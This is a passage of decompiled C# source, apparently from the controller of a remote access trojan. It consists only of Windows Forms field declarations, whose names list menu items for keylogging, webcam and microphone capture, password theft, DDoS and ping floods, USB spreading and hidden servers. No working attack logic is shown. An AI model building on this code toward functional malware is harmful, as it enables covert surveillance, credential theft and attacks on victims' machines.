		// Token: 0x040000B9 RID: 185
		[AccessedThroughProperty("ToolStripSeparator1")]
		private ToolStripSeparator _ToolStripSeparator1;

		// Token: 0x040000BA RID: 186
		[AccessedThroughProperty("ManagerToolStripMenuItem")]
		private ToolStripMenuItem _ManagerToolStripMenuItem;

		// Token: 0x040000BB RID: 187
		[AccessedThroughProperty("FileManagerToolStripMenuItem1")]
		private ToolStripMenuItem _FileManagerToolStripMenuItem1;

		// Token: 0x040000BC RID: 188
		[AccessedThroughProperty("ToolStripMenuItem3")]
		private ToolStripMenuItem _ToolStripMenuItem3;

		// Token: 0x040000BD RID: 189
		[AccessedThroughProperty("InstalledManagerToolStripMenuItem")]
		private ToolStripMenuItem _InstalledManagerToolStripMenuItem;

		// Token: 0x040000BE RID: 190
		[AccessedThroughProperty("StartupManagerToolStripMenuItem1")]
		private ToolStripMenuItem _StartupManagerToolStripMenuItem1;

		// Token: 0x040000BF RID: 191
		[AccessedThroughProperty("ToolStripMenuItem6")]
		private ToolStripMenuItem _ToolStripMenuItem6;

		// Token: 0x040000C0 RID: 192
		[AccessedThroughProperty("ToolStripMenuItem4")]
		private ToolStripMenuItem _ToolStripMenuItem4;

		// Token: 0x040000C1 RID: 193
		[AccessedThroughProperty("ToolStripMenuItem1")]
		private ToolStripMenuItem _ToolStripMenuItem1;

		// Token: 0x040000C2 RID: 194
		[AccessedThroughProperty("ConnectionsToolStripMenuItem1")]
		private ToolStripMenuItem _ConnectionsToolStripMenuItem1;

		// Token: 0x040000C3 RID: 195
		[AccessedThroughProperty("SendRunToolStripMenuItem")]
		private ToolStripMenuItem _SendRunToolStripMenuItem;

		// Token: 0x040000C4 RID: 196
		[AccessedThroughProperty("UpdateToolStripMenuItem1")]
		private ToolStripMenuItem _UpdateToolStripMenuItem1;

		// Token: 0x040000C5 RID: 197
		[AccessedThroughProperty("ToolStripSeparator3")]
		private ToolStripSeparator _ToolStripSeparator3;

		// Token: 0x040000C6 RID: 198
		[AccessedThroughProperty("RestartToolStripMenuItem1")]
		private ToolStripMenuItem _RestartToolStripMenuItem1;

		// Token: 0x040000C7 RID: 199
		[AccessedThroughProperty("UinstallToolStripMenuItem")]
		private ToolStripMenuItem _UinstallToolStripMenuItem;

		// Token: 0x040000C8 RID: 200
		[AccessedThroughProperty("CloseToolStripMenuItem1")]
		private ToolStripMenuItem _CloseToolStripMenuItem1;

		// Token: 0x040000C9 RID: 201
		[AccessedThroughProperty("UsersFolderToolStripMenuItem")]
		private ToolStripMenuItem _UsersFolderToolStripMenuItem;

		// Token: 0x040000CA RID: 202
		[AccessedThroughProperty("DisconnectServerToolStripMenuItem")]
		private ToolStripMenuItem _DisconnectServerToolStripMenuItem;

		// Token: 0x040000CB RID: 203
		[AccessedThroughProperty("ToolStripSeparator4")]
		private ToolStripSeparator _ToolStripSeparator4;

		// Token: 0x040000CC RID: 204
		[AccessedThroughProperty("CommandsToolStripMenuItem")]
		private ToolStripMenuItem _CommandsToolStripMenuItem;

		// Token: 0x040000CD RID: 205
		[AccessedThroughProperty("ShellExecuteToolStripMenuItem")]
		private ToolStripMenuItem _ShellExecuteToolStripMenuItem;

		// Token: 0x040000CE RID: 206
		[AccessedThroughProperty("OpenWebPageToolStripMenuItem")]
		private ToolStripMenuItem _OpenWebPageToolStripMenuItem;

		// Token: 0x040000CF RID: 207
		[AccessedThroughProperty("PingFloodsToolStripMenuItem")]
		private ToolStripMenuItem _PingFloodsToolStripMenuItem;

		// Token: 0x040000D0 RID: 208
		[AccessedThroughProperty("KillProcessToolStripMenuItem")]
		private ToolStripMenuItem _KillProcessToolStripMenuItem;

		// Token: 0x040000D1 RID: 209
		[AccessedThroughProperty("NewTaskRunToolStripMenuItem")]
		private ToolStripMenuItem _NewTaskRunToolStripMenuItem;

		// Token: 0x040000D2 RID: 210
		[AccessedThroughProperty("RestartComputerToolStripMenuItem")]
		private ToolStripMenuItem _RestartComputerToolStripMenuItem;

		// Token: 0x040000D3 RID: 211
		[AccessedThroughProperty("LogOffComputerToolStripMenuItem")]
		private ToolStripMenuItem _LogOffComputerToolStripMenuItem;

		// Token: 0x040000D4 RID: 212
		[AccessedThroughProperty("ShutDownComputerToolStripMenuItem")]
		private ToolStripMenuItem _ShutDownComputerToolStripMenuItem;

		// Token: 0x040000D5 RID: 213
		[AccessedThroughProperty("RenameServerToolStripMenuItem")]
		private ToolStripMenuItem _RenameServerToolStripMenuItem;

		// Token: 0x040000D6 RID: 214
		[AccessedThroughProperty("PWD")]
		private TextBox _PWD;

		// Token: 0x040000D7 RID: 215
		[AccessedThroughProperty("USR")]
		private TextBox _USR;

		// Token: 0x040000D8 RID: 216
		[AccessedThroughProperty("IMGNEWS")]
		private ImageList _IMGNEWS;

		// Token: 0x040000D9 RID: 217
		[AccessedThroughProperty("Timer1")]
		private System.Windows.Forms.Timer _Timer1;

		// Token: 0x040000DA RID: 218
		[AccessedThroughProperty("Button8")]
		private Button _Button8;

		// Token: 0x040000DB RID: 219
		[AccessedThroughProperty("Button9")]
		private Button _Button9;

		// Token: 0x040000DC RID: 220
		[AccessedThroughProperty("Button10")]
		private Button _Button10;

		// Token: 0x040000DD RID: 221
		[AccessedThroughProperty("ServerShieldToolStripMenuItem")]
		private ToolStripMenuItem _ServerShieldToolStripMenuItem;

		// Token: 0x040000DE RID: 222
		[AccessedThroughProperty("ControlBuilder1")]
		private ControlBuilder _ControlBuilder1;

		// Token: 0x040000DF RID: 223
		[AccessedThroughProperty("Pnews")]
		private Panel _Pnews;

		// Token: 0x040000E0 RID: 224
		[AccessedThroughProperty("PanelNews")]
		private Panel _PanelNews;

		// Token: 0x040000E1 RID: 225
		[AccessedThroughProperty("Panel4")]
		private Panel _Panel4;

		// Token: 0x040000E2 RID: 226
		[AccessedThroughProperty("B3")]
		private Button _B3;

		// Token: 0x040000E3 RID: 227
		[AccessedThroughProperty("B2")]
		private Button _B2;

		// Token: 0x040000E4 RID: 228
		[AccessedThroughProperty("B1")]
		private Button _B1;

		// Token: 0x040000E5 RID: 229
		[AccessedThroughProperty("B4")]
		private Button _B4;

		// Token: 0x040000E6 RID: 230
		[AccessedThroughProperty("WindowsListToolStripMenuItem")]
		private ToolStripMenuItem _WindowsListToolStripMenuItem;

		// Token: 0x040000E7 RID: 231
		[AccessedThroughProperty("ToolStripMenuItem7")]
		private ToolStripMenuItem _ToolStripMenuItem7;

		// Token: 0x040000E8 RID: 232
		[AccessedThroughProperty("GroupDropBox10")]
		private GroupDropBox _GroupDropBox10;

		// Token: 0x040000E9 RID: 233
		[AccessedThroughProperty("GroupDropBox3")]
		private GroupDropBox _GroupDropBox3;

		// Token: 0x040000EA RID: 234
		[AccessedThroughProperty("GroupDropBox4")]
		private GroupDropBox _GroupDropBox4;

		// Token: 0x040000EB RID: 235
		[AccessedThroughProperty("GroupDropBox8")]
		private GroupDropBox _GroupDropBox8;

		// Token: 0x040000EC RID: 236
		[AccessedThroughProperty("GroupDropBox7")]
		private GroupDropBox _GroupDropBox7;

		// Token: 0x040000ED RID: 237
		[AccessedThroughProperty("Global_Notes")]
		private Panel _Global_Notes;

		// Token: 0x040000EE RID: 238
		[AccessedThroughProperty("TextBox1")]
		private TextBox _TextBox1;

		// Token: 0x040000EF RID: 239
		[AccessedThroughProperty("Button14")]
		private Button _Button14;

		// Token: 0x040000F0 RID: 240
		[AccessedThroughProperty("IMG_Flags")]
		private ImageList _IMG_Flags;

		// Token: 0x040000F1 RID: 241
		[AccessedThroughProperty("ColumnHeader16")]
		private ColumnHeader _ColumnHeader16;

		// Token: 0x040000F2 RID: 242
		[AccessedThroughProperty("ControlAbout1")]
		private ControlAbout _ControlAbout1;

		// Token: 0x040000F3 RID: 243
		[AccessedThroughProperty("ImageList1")]
		private ImageList _ImageList1;

		// Token: 0x040000F4 RID: 244
		[AccessedThroughProperty("EditFileHostToolStripMenuItem")]
		private ToolStripMenuItem _EditFileHostToolStripMenuItem;

		// Token: 0x040000F5 RID: 245
		[AccessedThroughProperty("ControlShatroom1")]
		private ControlShatroom _ControlShatroom1;

		// Token: 0x040000F6 RID: 246
		[AccessedThroughProperty("ControlDetector1")]
		private ControlDetector _ControlDetector1;

		// Token: 0x040000F7 RID: 247
		[AccessedThroughProperty("KeyloggerToolStripMenuItem1")]
		private ToolStripMenuItem _KeyloggerToolStripMenuItem1;

		// Token: 0x040000F8 RID: 248
		[AccessedThroughProperty("Panel1")]
		private Panel _Panel1;

		// Token: 0x040000F9 RID: 249
		[AccessedThroughProperty("Button12")]
		private Button _Button12;

		// Token: 0x040000FA RID: 250
		[AccessedThroughProperty("DesktopToolStripMenuItem")]
		private ToolStripMenuItem _DesktopToolStripMenuItem;

		// Token: 0x040000FB RID: 251
		[AccessedThroughProperty("WebcamToolStripMenuItem")]
		private ToolStripMenuItem _WebcamToolStripMenuItem;

		// Token: 0x040000FC RID: 252
		[AccessedThroughProperty("MicrophoneToolStripMenuItem1")]
		private ToolStripMenuItem _MicrophoneToolStripMenuItem1;

		// Token: 0x040000FD RID: 253
		[AccessedThroughProperty("ChatToolStripMenuItem")]
		private ToolStripMenuItem _ChatToolStripMenuItem;

		// Token: 0x040000FE RID: 254
		[AccessedThroughProperty("GetPasswordToolStripMenuItem")]
		private ToolStripMenuItem _GetPasswordToolStripMenuItem;

		// Token: 0x040000FF RID: 255
		[AccessedThroughProperty("DDoSStresserToolStripMenuItem1")]
		private ToolStripMenuItem _DDoSStresserToolStripMenuItem1;

		// Token: 0x04000100 RID: 256
		[AccessedThroughProperty("ToolStripMenuItem5")]
		private ToolStripMenuItem _ToolStripMenuItem5;

		// Token: 0x04000101 RID: 257
		[AccessedThroughProperty("IPLockupToolStripMenuItem1")]
		private ToolStripMenuItem _IPLockupToolStripMenuItem1;

		// Token: 0x04000102 RID: 258
		[AccessedThroughProperty("PluginInformationsToolStripMenuItem")]
		private ToolStripMenuItem _PluginInformationsToolStripMenuItem;

		// Token: 0x04000103 RID: 259
		[AccessedThroughProperty("ScriptToolStripMenuItem1")]
		private ToolStripMenuItem _ScriptToolStripMenuItem1;

		// Token: 0x04000104 RID: 260
		[AccessedThroughProperty("FromDiskToolStripMenuItem3")]
		private ToolStripMenuItem _FromDiskToolStripMenuItem3;

		// Token: 0x04000105 RID: 261
		[AccessedThroughProperty("HiddenServerToolStripMenuItem")]
		private ToolStripMenuItem _HiddenServerToolStripMenuItem;

		// Token: 0x04000106 RID: 262
		[AccessedThroughProperty("InformationsToolStripMenuItem1")]
		private ToolStripMenuItem _InformationsToolStripMenuItem1;

		// Token: 0x04000107 RID: 263
		[AccessedThroughProperty("SellectAllServersToolStripMenuItem")]
		private ToolStripMenuItem _SellectAllServersToolStripMenuItem;

		// Token: 0x04000108 RID: 264
		[AccessedThroughProperty("CopyIPAddressToolStripMenuItem1")]
		private ToolStripMenuItem _CopyIPAddressToolStripMenuItem1;

		// Token: 0x04000109 RID: 265
		[AccessedThroughProperty("AToolStripMenuItem1")]
		private ToolStripSeparator _AToolStripMenuItem1;

		// Token: 0x0400010A RID: 266
		[AccessedThroughProperty("ClearAllPluginsToolStripMenuItem")]
		private ToolStripMenuItem _ClearAllPluginsToolStripMenuItem;

		// Token: 0x0400010B RID: 267
		[AccessedThroughProperty("AToolStripMenuItem2")]
		private ToolStripSeparator _AToolStripMenuItem2;

		// Token: 0x0400010C RID: 268
		[AccessedThroughProperty("AntiProcessHackerToolStripMenuItem")]
		private ToolStripMenuItem _AntiProcessHackerToolStripMenuItem;

		// Token: 0x0400010D RID: 269
		[AccessedThroughProperty("NotifyIcon1")]
		private NotifyIcon _NotifyIcon1;

		// Token: 0x0400010E RID: 270
		[AccessedThroughProperty("NotifMenu")]
		private ContextMenuStrip _NotifMenu;

		// Token: 0x0400010F RID: 271
		[AccessedThroughProperty("ShowToolStripMenuItem")]
		private ToolStripMenuItem _ShowToolStripMenuItem;

		// Token: 0x04000110 RID: 272
		[AccessedThroughProperty("ExitToolStripMenuItem")]
		private ToolStripMenuItem _ExitToolStripMenuItem;

		// Token: 0x04000111 RID: 273
		[AccessedThroughProperty("SC1")]
		private CheckBox _SC1;

		// Token: 0x04000112 RID: 274
		[AccessedThroughProperty("UsbSpreadsToolStripMenuItem")]
		private ToolStripMenuItem _UsbSpreadsToolStripMenuItem;

		// Token: 0x04000113 RID: 275
		[AccessedThroughProperty("ToolStripSeparator5")]
		private ToolStripSeparator _ToolStripSeparator5;

		// Token: 0x04000114 RID: 276
		[AccessedThroughProperty("ToolStripSeparator7")]
		private ToolStripSeparator _ToolStripSeparator7;

		// Token: 0x04000115 RID: 277
		[AccessedThroughProperty("ToolStripSeparator8")]
		private ToolStripSeparator _ToolStripSeparator8;

		// Token: 0x04000116 RID: 278
		[AccessedThroughProperty("ToolStripSeparator6")]
		private ToolStripSeparator _ToolStripSeparator6;

		// Token: 0x04000117 RID: 279
		[AccessedThroughProperty("sl")]
		private Label _sl;

		// Token: 0x04000118 RID: 280
		[AccessedThroughProperty("Label19")]
		private Label _Label19;

		// Token: 0x04000119 RID: 281
		[AccessedThroughProperty("ControNe1")]
		private ControNe _ControNe1;

		// Token: 0x0400011A RID: 282
		[AccessedThroughProperty("ControlToolBOX1")]
		private ControlToolBOX _ControlToolBOX1;

		// Token: 0x0400011B RID: 283
		[AccessedThroughProperty("B5")]
		private Button _B5;

		// Token: 0x0400011C RID: 284
		[AccessedThroughProperty("PictureBox1")]
		private PictureBox _PictureBox1;

		// Token: 0x0400011D RID: 285
		[AccessedThroughProperty("SC2")]
		private CheckBox _SC2;

		// Token: 0x0400011E RID: 286
		[AccessedThroughProperty("Panel2")]
		private Panel _Panel2;

		// Token: 0x0400011F RID: 287
		[AccessedThroughProperty("Label18")]
		private Label _Label18;

		// Token: 0x04000120 RID: 288
		[AccessedThroughProperty("Ploading")]
		private Panel _Ploading;

		// Token: 0x04000121 RID: 289
		[AccessedThroughProperty("PictureBox3")]
		private PictureBox _PictureBox3;

		// Token: 0x04000122 RID: 290
		[AccessedThroughProperty("Labelloading")]
		private Label _Labelloading;

		// Token: 0x04000123 RID: 291
		[AccessedThroughProperty("prloading")]
		private CHProgressbar _prloading;

		// Token: 0x04000124 RID: 292
		[AccessedThroughProperty("Label20")]
		private Label _Label20;

		// Token: 0x04000125 RID: 293
		public Client CEL;

		// Token: 0x04000126 RID: 294
		public bool PMON;

		// Token: 0x04000127 RID: 295
		public int port;

		// Token: 0x04000128 RID: 296
		public SocketServer S;

		// Token: 0x04000129 RID: 297
		public object updatenoip;

		// Token: 0x0400012A RID: 298
		public object active;

		// Token: 0x0400012B RID: 299
		public bool headertext;

		// Token: 0x0400012C RID: 300
		public string Edition;

		// Token: 0x0400012D RID: 301
		public string USER;

		// Token: 0x0400012E RID: 302
		public string PASSWORD;

		// Token: 0x0400012F RID: 303
		public bool PRS;

		// Token: 0x04000130 RID: 304
		public bool ULT;

		// Token: 0x04000131 RID: 305
		public object updatenews;

		// Token: 0x04000132 RID: 306
		public object register;

		// Token: 0x04000133 RID: 307
		public bool groupdrop;

		// Token: 0x04000134 RID: 308
		public DateTime av;

		// Token: 0x04000135 RID: 309
		public object K;

		// Token: 0x04000136 RID: 310
		private object sev;

		// Token: 0x04000137 RID: 311
		private object T;

		// Token: 0x04000138 RID: 312
		public string folder;
	}
}
